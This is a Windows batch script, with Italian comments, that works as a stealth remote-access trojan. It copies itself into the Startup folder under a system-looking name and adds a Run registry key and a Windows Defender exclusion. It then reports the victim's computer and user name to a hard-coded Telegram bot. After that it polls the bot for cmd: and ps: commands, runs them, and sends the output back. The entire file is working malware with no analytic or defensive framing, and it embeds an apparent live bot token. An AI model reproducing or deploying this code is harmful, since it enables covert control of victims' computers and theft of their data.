@echo off
:: Fase 1 - Auto-Installazione Stealth
if not "%1"=="--ghost" (
    :: Copia in startup con nome legittimo
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost_helper.bat" >nul
    
    :: Aggiungi al registro
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "RuntimeBroker" /t REG_SZ /d "\"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost_helper.bat\"" /f >nul
    
    :: Aggiungi esclusione in Windows Defender
    powershell -command "Add-MpPreference -ExclusionPath \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\" -ErrorAction SilentlyContinue"
    
    :: Riavvio in modalità fantasma
    start /B /MIN cmd /c "%~f0" --ghost
    exit
)

:: Fase 2 - Modalità Operativa Invisibile
:main
setlocal enabledelayedexpansion

:: Configurazione Bot
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "API_URL=https://api.telegram.org/bot%BOT_TOKEN%"

:: Notifica connessione
powershell -command "$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=🖥️ [%COMPUTERNAME%] - %USERNAME% online' -UseBasicParsing"

:: Loop principale
:command_loop
for /f "delims=" %%A in ('powershell -command "$resp=try{Invoke-WebRequest -Uri '!API_URL!/getUpdates' -UseBasicParsing|ConvertFrom-Json}catch{}; $resp.result[-1].message.text"') do (
    set "COMMAND=%%A"
)

if "!COMMAND!"=="exit" (
    powershell -command "$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=❌ Session terminated' -UseBasicParsing"
    exit
)

if "!COMMAND:~0,4!"=="cmd:" (
    set "CMD=!COMMAND:~4!"
    for /f "delims=" %%B in ('!CMD! 2^>^&1') do set "OUTPUT=%%B"
    powershell -command "$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=!OUTPUT!' -UseBasicParsing"
)

if "!COMMAND:~0,3!"=="ps:" (
    set "PS_CMD=!COMMAND:~3!"
    powershell -command "$out=try{Invoke-Expression '!PS_CMD!'|Out-String}catch{$_.Exception};$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=$out' -UseBasicParsing"
)

:: Attesa randomica (3-10 secondi)
powershell -command "Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 10)"
goto command_loop